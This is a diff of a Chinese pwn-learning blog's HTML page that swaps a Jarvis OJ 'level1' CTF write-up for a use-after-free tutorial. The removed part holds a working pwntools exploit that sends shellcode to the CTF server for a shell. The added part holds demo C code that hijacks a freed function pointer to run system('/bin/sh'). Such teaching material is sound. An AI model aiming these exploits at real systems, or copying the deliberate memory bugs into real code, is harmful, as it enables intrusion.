@@ -81,18 +81,20 @@
 
 
 
-<meta name="description" content="0x01 寻找漏洞12345678910111213141516171819202122232425262728xfgg@ubuntu:~/Documents$ file level1.80eacdcd51aca92af7749d96efad7fb5 level1.80eacdcd51aca92af7749d96efad7fb5: ELF 32-bit LSB executable, Intel">
+<meta name="description" content="觉得还是整理一下比较好，可以联系how2heap里的文章帮助理解，最好结合题目来做会比较简单，后面的文章我会做几题 原文：https://blog.csdn.net/qq_31481187/article/details/73612451 0x01 原理1234567891011121314151617181920212223242526272829一段简单的代码 帮助理解#include &amp;lt">
 <meta name="keywords" content="pwn">
 <meta property="og:type" content="article">
-<meta property="og:title" content="level1">
-<meta property="og:url" content="http://yoursite.com/2019/07/31/level1/index.html">
+<meta property="og:title" content="UAF漏洞">
+<meta property="og:url" content="http://yoursite.com/2019/08/06/uaf漏洞/index.html">
 <meta property="og:site_name" content="xfgg">
-<meta property="og:description" content="0x01 寻找漏洞12345678910111213141516171819202122232425262728xfgg@ubuntu:~/Documents$ file level1.80eacdcd51aca92af7749d96efad7fb5 level1.80eacdcd51aca92af7749d96efad7fb5: ELF 32-bit LSB executable, Intel">
+<meta property="og:description" content="觉得还是整理一下比较好，可以联系how2heap里的文章帮助理解，最好结合题目来做会比较简单，后面的文章我会做几题 原文：https://blog.csdn.net/qq_31481187/article/details/73612451 0x01 原理1234567891011121314151617181920212223242526272829一段简单的代码 帮助理解#include &amp;lt">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-07-31T06:02:14.100Z">
+<meta property="og:image" content="https://img-blog.csdn.net/20170623001441464?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:updated_time" content="2019-08-06T15:12:03.660Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="level1">
-<meta name="twitter:description" content="0x01 寻找漏洞12345678910111213141516171819202122232425262728xfgg@ubuntu:~/Documents$ file level1.80eacdcd51aca92af7749d96efad7fb5 level1.80eacdcd51aca92af7749d96efad7fb5: ELF 32-bit LSB executable, Intel">
+<meta name="twitter:title" content="UAF漏洞">
+<meta name="twitter:description" content="觉得还是整理一下比较好，可以联系how2heap里的文章帮助理解，最好结合题目来做会比较简单，后面的文章我会做几题 原文：https://blog.csdn.net/qq_31481187/article/details/73612451 0x01 原理1234567891011121314151617181920212223242526272829一段简单的代码 帮助理解#include &amp;lt">
+<meta name="twitter:image" content="https://img-blog.csdn.net/20170623001441464?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
 
 
 
@@ -122,13 +124,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/07/31/level1/">
+  <link rel="canonical" href="http://yoursite.com/2019/08/06/uaf漏洞/">
 
 
 
 
 
-  <title>level1 | xfgg</title>
+  <title>UAF漏洞 | xfgg</title>
   
 
 
@@ -255,7 +257,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/31/level1/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/06/uaf漏洞/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="xfgg">
@@ -272,7 +274,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">level1</h1>
+          <h1 class="post-title" itemprop="name headline">UAF漏洞</h1>
         
 
         <div class="post-meta">
@@ -284,8 +286,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-31T13:28:39+08:00">
-                2019-07-31
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-06T23:05:50+08:00">
+                2019-08-06
               </time>
             
 
@@ -307,8 +309,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/jarvis-OJ/" itemprop="url" rel="index">
-                    <span itemprop="name">jarvis OJ</span>
+                  <a href="/categories/百度学习/" itemprop="url" rel="index">
+                    <span itemprop="name">百度学习</span>
                   </a>
                 </span>
 
@@ -344,11 +346,14 @@
       
 
       
-        <h3 id="0x01-寻找漏洞"><a href="#0x01-寻找漏洞" class="headerlink" title="0x01 寻找漏洞"></a>0x01 寻找漏洞</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">xfgg@ubuntu:~/Documents$ file level1.80eacdcd51aca92af7749d96efad7fb5 </span><br><span class="line">level1.80eacdcd51aca92af7749d96efad7fb5: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=7d479bd8046d018bbb3829ab97f6196c0238b344, not stripped</span><br><span class="line">xfgg@ubuntu:~/Documents$ checksec level1.80eacdcd51aca92af7749d96efad7fb5</span><br><span class="line">[*] <span class="string">'/home/xfgg/Documents/level1.80eacdcd51aca92af7749d96efad7fb5'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line">什么保护都没开！！！</span><br><span class="line"></span><br><span class="line">ida分析</span><br><span class="line"></span><br><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  write(1, <span class="string">"Hello, World!\n"</span>, 0xEu);</span><br><span class="line">  <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ssize_t vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [esp+0h] [ebp-88h]</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"What's this:%p?\n"</span>, &amp;buf);</span><br><span class="line">  <span class="built_in">return</span> <span class="built_in">read</span>(0, &amp;buf, 0x100u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+        <p>觉得还是整理一下比较好，可以联系how2heap里的文章帮助理解，最好结合题目来做会比较简单，后面的文章我会做几题</p>
+<p>原文：<a href="https://blog.csdn.net/qq_31481187/article/details/73612451" target="_blank" rel="noopener">https://blog.csdn.net/qq_31481187/article/details/73612451</a></p>
+<h3 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">一段简单的代码 帮助理解</span><br><span class="line"></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;cstdlib&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char *p1;</span><br><span class="line">    p1 = (char *) malloc(sizeof(char)*10);//申请内存空间</span><br><span class="line">    memcpy(p1,<span class="string">"hello"</span>,10);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"p1 addr:%x,%s\n"</span>,p1,p1);</span><br><span class="line">    free(p1);//释放内存空间</span><br><span class="line">    char *p2;</span><br><span class="line">    p2 = (char *)malloc(sizeof(char)*10);//二次申请内存空间，与第一次大小相同，申请到了同一块内存</span><br><span class="line">    memcpy(p1,<span class="string">"world"</span>,10);//对内存进行修改</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"p2 addr:%x,%s\n"</span>,p2,p1);//验证</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">1.指针p1申请内存，打印其地址值 </span><br><span class="line">2.然后释放p1 </span><br><span class="line">3.指针p2申请同样大小的内存，打印p2的地址，p1指针指向的值</span><br><span class="line"></span><br><span class="line">p1与p2地址相同，p1指针释放后，p2申请相同的大小的内存，操作系统会将之前给p1的地址分配给p2，修改p2的值，p1也被修改了</span><br><span class="line"></span><br><span class="line">应用程序调用free()释放内存时，如果内存块小于256kb，dlmalloc并不马上将内存块释放回内存，而是将内存块标记为空闲状态。这么做的原因有两个：一是内存块不一定能马上释放会内核（比如内存块不是位于堆顶端），二是供应用程序下次申请内存使用（这是主要原因）。当dlmalloc中空闲内存量达到一定值时dlmalloc才将空闲内存释放会内核。如果应用程序申请的内存大于256kb，dlmalloc调用mmap()向内核申请一块内存，返回返还给应用程序使用。如果应用程序释放的内存大于256kb，dlmalloc马上调用munmap()释放内存。dlmalloc不会缓存大于256kb的内存块，因为这样的内存块太大了，最好不要长期占用这么大的内存资源。</span><br><span class="line"></span><br><span class="line">简单讲就是第一次申请的内存空间在释放过后没有进行内存回收，导致下次申请内存的时候再次使用该内存块，使得以前的内存指针可以访问修改过的内存。</span><br></pre></td></tr></table></figure>
 
-<h3 id="0x02-思路分析"><a href="#0x02-思路分析" class="headerlink" title="0x02 思路分析"></a>0x02 思路分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">一开始以为是write函数无libc泄露</span><br><span class="line">发现没有system做不下去了 没开保护 写入shellcode</span><br></pre></td></tr></table></figure>
+<h3 id="漏洞的简单利用"><a href="#漏洞的简单利用" class="headerlink" title="漏洞的简单利用"></a>漏洞的简单利用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">还是一段简单的程序</span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line">typedef void (*func_ptr)(char *);</span><br><span class="line">void evil_fuc(char <span class="built_in">command</span>[])</span><br><span class="line">&#123;</span><br><span class="line">system(<span class="built_in">command</span>);</span><br><span class="line">&#125;</span><br><span class="line">void <span class="built_in">echo</span>(char content[])</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s"</span>,content);</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    func_ptr *p1=(func_ptr*)malloc(4*sizeof(int));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"malloc addr: %p\n"</span>,p1);</span><br><span class="line">    p1[3]=<span class="built_in">echo</span>;</span><br><span class="line">    p1[3](<span class="string">"hello world\n"</span>);</span><br><span class="line">    free(p1); //在这里free了p1,但并未将p1置空,导致后续可以再使用p1指针</span><br><span class="line">    p1[3](<span class="string">"hello again\n"</span>); //p1指针未被置空,虽然free了,但仍可使用.</span><br><span class="line">    func_ptr *p2=(func_ptr*)malloc(4*sizeof(int));//malloc在free一块内存后,再次申请同样大小的指针会把刚刚释放的内存分配出来.</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"malloc addr: %p\n"</span>,p2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"malloc addr: %p\n"</span>,p1);//p2与p1指针指向的内存为同一地址</span><br><span class="line">    p2[3]=evil_fuc; //在这里将p1指针里面保存的<span class="built_in">echo</span>函数指针覆盖成为了evil_func指针.</span><br><span class="line">    p1[3](<span class="string">"/bin/sh"</span>);</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import * </span><br><span class="line">p=remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="string">"9877"</span>)</span><br><span class="line">shellcode_addr=p.recvuntil(<span class="string">'?'</span>,drop=True)</span><br><span class="line">shellcode_addr=int(shellcode_addr[12:],16)</span><br><span class="line">pad=0x88</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">payload=shellcode.ljust(pad,<span class="string">'A'</span>)+<span class="string">"BBBB"</span>+p32(shellcode_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive();</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdn.net/20170623001441464?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt></p>
+
       
     </div>
     
@@ -378,8 +383,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/07/31/tell me someting/" rel="next" title="tell me something">
-                <i class="fa fa-chevron-left"></i> tell me something
+              <a href="/2019/08/06/weapon/" rel="next" title="weapon">
+                <i class="fa fa-chevron-left"></i> weapon
               </a>
             
           </div>
@@ -387,10 +392,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/08/02/first_fit.c/" rel="prev" title="first_fit">
-                first_fit <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -529,7 +530,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-寻找漏洞"><span class="nav-number">1.</span> <span class="nav-text">0x01 寻找漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-思路分析"><span class="nav-number">2.</span> <span class="nav-text">0x02 思路分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">3.</span> <span class="nav-text">exp</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-原理"><span class="nav-number">1.</span> <span class="nav-text">0x01 原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞的简单利用"><span class="nav-number">2.</span> <span class="nav-text">漏洞的简单利用</span></a></li></ol></div>
             
 
           </div>
